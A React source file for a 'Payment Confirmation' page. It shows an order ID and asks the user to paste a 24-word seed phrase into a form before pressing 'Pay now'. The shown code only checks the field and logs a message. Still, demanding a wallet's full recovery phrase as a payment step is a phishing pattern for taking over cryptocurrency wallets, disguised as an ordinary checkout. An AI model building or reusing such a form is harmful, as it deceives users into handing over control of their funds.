import { useState } from "react";
import { useParams } from "react-router-dom";
import { Box, Typography, TextField, Button } from "@mui/material";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

const PaymentPage = () => {
  const { orderId } = useParams();
  const [passphrase, setPassphrase] = useState("");

  const handlePayment = () => {
    if (!passphrase.trim()) {
      toast.error("You have to put the 24-word passcode!");
      return;
    }
    // Proceed with payment process
    console.log("Processing payment...");
  };

  return (
    <Box sx={{ padding: "20px" }}>
      <Typography sx={{ fontSize: "24px", fontWeight: "bold", textAlign: "center" }}>
        Payment Confirmation
      </Typography>
      <Box sx={{ my: 3 }}>
        <Typography>Order ID:</Typography>
        <Typography sx={{ color: "#FF9A00" }}>{orderId}</Typography>
      </Box>

      <Box component="form" sx={{ "& .MuiTextField-root": { width: "100%" } }} noValidate autoComplete="on">
        <TextField
          id="passphrase-input"
          label="Paste your 24-word seed phrase here"
          multiline
          rows={4}
          variant="filled"
          value={passphrase}
          onChange={(e) => setPassphrase(e.target.value)}
          required
        />
      </Box>
      <Box sx={{ display: "flex", justifyContent: "center", my: "1rem" }}>
        <Button variant="contained" sx={{ backgroundColor: "#362FFF", width: "55%", padding: "10px" }} onClick={handlePayment}>
          Pay now
        </Button>
      </Box>
      <ToastContainer />
    </Box>
  );
};

export default PaymentPage;
